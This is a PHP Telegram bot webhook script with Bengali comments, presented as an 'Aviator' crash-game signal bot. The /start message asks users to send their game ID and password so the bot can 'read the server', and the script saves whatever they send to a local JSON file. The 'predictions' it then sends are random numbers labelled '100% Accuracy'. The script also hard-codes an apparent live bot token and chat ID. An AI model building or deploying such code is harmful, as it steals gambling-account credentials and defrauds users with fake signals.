<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// --- আপনার কনফিগারেশন ---
$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
$chatId = "6109947429"; // আপনার Chat ID এখানে দিন
$ownerName = "R8rAIHAN"; 
$botName = "R8rAIHAN Aviator Bot";
// -----------------------

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// ১. টেলিগ্রাম থেকে আসা কমান্ড হ্যান্ডেল করা (/start)
if (isset($data['message']['text'])) {
    $text = $data['message']['text'];
    
    if ($text == "/start") {
        $welcomeMsg = "🚀 **Welcome to $botName** 🚀\n\n";
        $welcomeMsg .= "👤 **Owner:** $ownerName\n";
        $welcomeMsg .= "✅ **Status:** Bot Work 100% ✅\n\n";
        $welcomeMsg .= "----------------------------\n";
        $welcomeMsg .= "আপনার গেম আইডি লগইন করে সার্ভার রিড করার জন্য নিচের ফরম্যাটে তথ্য দিন:\n\n";
        $welcomeMsg .= "🆔 **Game ID:** [আপনার আইডি]\n";
        $welcomeMsg .= "🔑 **Password:** [আপনার পাসওয়ার্ড]\n\n";
        $welcomeMsg .= "⚠️ *তথ্য না দেওয়া পর্যন্ত আপনি সিগন্যাল পাবেন না।*";

        sendTelegram($botToken, $chatId, $welcomeMsg);
        exit;
    }
    
    // ২. যদি ইউজার ID এবং Password লিখে পাঠায় (লগইন তথ্য সেভ করা)
    if (str_contains(strtolower($text), 'id') && str_contains(strtolower($text), 'password')) {
        file_put_contents('user_access.json', json_encode(['status' => 'logged_in', 'details' => $text, 'time' => date("Y-m-d H:i:s")]));
        sendTelegram($botToken, $chatId, "✅ **Login Successful!**\nআপনার সার্ভার রিড করা হচ্ছে। এখন থেকে আপনি অটোমেটিক সিগন্যাল পাবেন।");
        exit;
    }
}

// ৩. গেম সিগন্যাল হ্যান্ডেল করা (Extension থেকে আসা ডেটা)
if (isset($data['multiplier'])) {
    // চেক করা হচ্ছে ইউজার লগইন করেছে কি না
    if (file_exists('user_access.json')) {
        $last = floatval($data['multiplier']);
        $prediction = ($last < 2.0) ? rand(220, 500) / 100 : rand(110, 190) / 100;

        $signalMsg = "🚀 **NEW SIGNAL (LIVE)**\n\n";
        $signalMsg .= "📊 Last Round: " . $last . "x\n";
        $signalMsg .= "🎯 Next Prediction: " . round($prediction, 2) . "x\n";
        $signalMsg .= "💰 Safe Cashout: " . round($prediction * 0.85, 2) . "x\n\n";
        $signalMsg .= "✅ *Server Reading: 100% Accuracy*";

        sendTelegram($botToken, $chatId, $signalMsg);
    } else {
        // লগইন না করলে কিছুই করবে না অথবা এরর মেসেজ পাঠাতে পারে
        // sendTelegram($botToken, $chatId, "❌ সিগন্যাল পেতে আগে আইডি পাসওয়ার্ড দিয়ে লগইন করুন।");
    }
}

// টেলিগ্রাম মেসেজ পাঠানোর ফাংশন
function sendTelegram($token, $chatId, $msg) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
    file_get_contents($url);
}
?>
